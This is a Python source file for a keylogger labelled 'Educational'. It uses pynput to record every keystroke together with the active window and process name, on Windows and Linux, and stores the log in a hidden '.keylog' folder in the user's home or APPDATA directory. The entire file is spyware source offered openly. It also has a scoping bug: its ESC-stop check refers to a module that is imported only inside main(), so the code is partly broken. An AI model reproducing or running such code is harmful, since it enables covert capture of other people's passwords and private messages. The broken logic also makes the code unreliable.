import os
import sys
import logging
import platform
from datetime import datetime

# ---- Cross-platform window / process helpers ----
def get_active_window():
    system = platform.system()
    if system == "Windows":
        try:
            import win32gui
            import win32process
            import psutil
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process = psutil.Process(pid)
            return f"{process.name()} | {win32gui.GetWindowText(hwnd)}"
        except Exception:
            return "Unknown (Windows)"
    elif system == "Linux":
        try:
            import psutil
            # Use xprop (common on most DEs)
            import subprocess
            wid = subprocess.check_output(["xprop", "-root", "_NET_ACTIVE_WINDOW"]).decode()
            wid = wid.split()[-1]
            window_name = subprocess.check_output(["xprop", "-id", wid, "WM_NAME"]).decode()
            window_name = window_name.split('=', 1)[1].strip().strip('"')
            # Get PID via xprop _NET_WM_PID
            pid_line = subprocess.check_output(["xprop", "-id", wid, "_NET_WM_PID"]).decode()
            pid = int(pid_line.split()[-1])
            proc = psutil.Process(pid)
            return f"{proc.name()} | {window_name}"
        except Exception:
            return "Unknown (Linux)"
    else:
        return f"Unsupported OS: {system}"

# ---- Logging setup ----
def setup_logger():
    # Hidden log file
    if platform.system() == "Windows":
        log_dir = os.path.join(os.getenv("APPDATA"), ".keylog")
    else:
        log_dir = os.path.expanduser("~/.keylog")

    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "keylog.txt")

    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format="%(asctime)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    return logging.getLogger()

# ---- Key handler ----
def on_press(key, logger):
    try:
        k = key.char
    except AttributeError:
        k = f"[SPECIAL:{key.name}]"

    window = get_active_window()
    logger.info(f"{k} | {window}")

def on_release(key, listener):
    if key == keyboard.Key.esc:
        print("[*] ESC pressed – stopping keylogger.")
        return False  # Stop listener
    return True

# ---- Main ----
def main():
    print("[+] Educational Keylogger STARTED (Press ESC to stop)")
    print("[!] Logs saved to hidden file – check setup_logger() path")

    logger = setup_logger()

    # Start listener
    from pynput import keyboard
    with keyboard.Listener(
        on_press=lambda k: on_press(k, logger),
        on_release=lambda k: on_release(k, None)
    ) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {e}")
